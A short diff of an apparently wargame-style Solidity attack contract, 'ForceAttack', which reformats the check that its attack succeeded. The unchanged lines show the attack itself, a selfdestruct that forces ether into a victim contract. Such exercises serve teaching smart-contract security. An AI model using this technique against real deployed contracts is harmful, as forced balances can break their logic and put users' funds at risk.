@@ -18,9 +18,6 @@ contract ForceAttack {
 
         selfdestruct(payable(address(victimForce)));
 
-        require(
-            balance != address(victimForce).balance,
-            "Force: Attack failed"
-        );
+        require(balance != address(victimForce).balance, "Force: Attack failed");
     }
 }
